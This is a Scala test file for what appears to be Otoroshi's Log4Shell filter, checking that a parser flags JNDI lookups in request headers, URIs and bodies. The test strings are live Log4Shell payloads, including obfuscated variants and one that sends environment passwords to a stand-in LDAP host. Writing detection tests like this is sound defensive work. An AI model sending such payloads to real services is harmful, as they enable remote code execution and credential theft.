package functional

import akka.actor.ActorSystem
import akka.http.scaladsl.Http
import akka.http.scaladsl.model.{HttpMethods, HttpRequest}
import akka.stream.Materializer
import akka.util.ByteString
import org.scalatest.concurrent.{IntegrationPatience, ScalaFutures}
import org.scalatest.{MustMatchers, OptionValues, WordSpec}
import otoroshi.plugins.log4j.Log4jExpressionParser
import otoroshi.utils.syntax.implicits.BetterJsValue
import play.api.libs.json.{JsArray, JsObject, Json}

class Log4jShellSpec extends WordSpec with MustMatchers with OptionValues with ScalaFutures with IntegrationPatience {
  "Log4jShellFilter" should {
    "find bad headers" in {
      Log4jExpressionParser.parseAsExp("'${jndi:ldap://foo.bar/a}").hasJndi.mustBe(true)
      Log4jExpressionParser
        .parseAsExp("${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}")
        .hasJndi
        .mustBe(true)
      Log4jExpressionParser.parseAsExp("hello people ${jndi:ldap://127.0.0.1/a} foo").hasJndi.mustBe(true)
      Log4jExpressionParser.parseAsExp("hello people ${${lower:j}ndi:ldap://127.0.0.1/a} foo").hasJndi.mustBe(true)
      Log4jExpressionParser
        .parseAsExp(
          "${${env:FOO:-j}ndi:${lower:L}da${lower:P}://x.x.x.x:1389/FUZZ.HEADER.${docker:imageName}.${sys:user.home}.${sys:user.name}.${sys:java.vm.version}.${k8s:containerName}.${spring:spring.application.name}.${env:HOSTNAME}.${env:HOST}.${ctx:loginId}.${ctx:hostName}.${env:PASSWORD}.${env:MYSQL_PASSWORD}.${env:POSTGRES_PASSWORD}.${main:0}.${main:1}.${main:2}.${main:3}}"
        )
        .hasJndi
        .mustBe(true)
    }
    "find lot of bad headers" in {
      implicit val system = ActorSystem()
      implicit val ec     = system.dispatcher
      implicit val mat    = Materializer(system)
      val http            = Http()
      http
        .singleRequest(
          HttpRequest(
            uri =
              "https://gist.githubusercontent.com/mathieuancelin/57180d1b61d550e427b23250ff0cd7e7/raw/log4j-shell-attack.json",
            method = HttpMethods.GET
          )
        )
        .map { resp =>
          resp.entity.dataBytes.runFold(ByteString.empty)(_ ++ _).map { bodyRaw =>
            val parsed  = Json.parse(bodyRaw.utf8String)
            val bodyArr = parsed.as[JsArray]
            val body    = bodyArr.value
            body.foreach { request =>
              val uri        = request.select("uri").asOpt[String].getOrElse("--")
              val method     = request.select("method").asOpt[String].getOrElse("--")
              val body       = request.select("body").asOpt[String].getOrElse("--")
              val headers    = request.select("headers").asOpt[JsObject].getOrElse(Json.obj())
              val badMethod  = Log4jExpressionParser.parseAsExp(method).hasJndi
              val badUri     = Log4jExpressionParser.parseAsExp(uri).hasJndi
              val badBody    = Log4jExpressionParser.parseAsExp(body).hasJndi
              val headerz    = headers.value.values.map(_.as[String])
              val badHeaders = headerz.exists(Log4jExpressionParser.parseAsExp(_).hasJndi)
              (badBody || badHeaders || badMethod || badUri).mustBe(true)
            }
          }
        }
        .futureValue
    }
  }
}
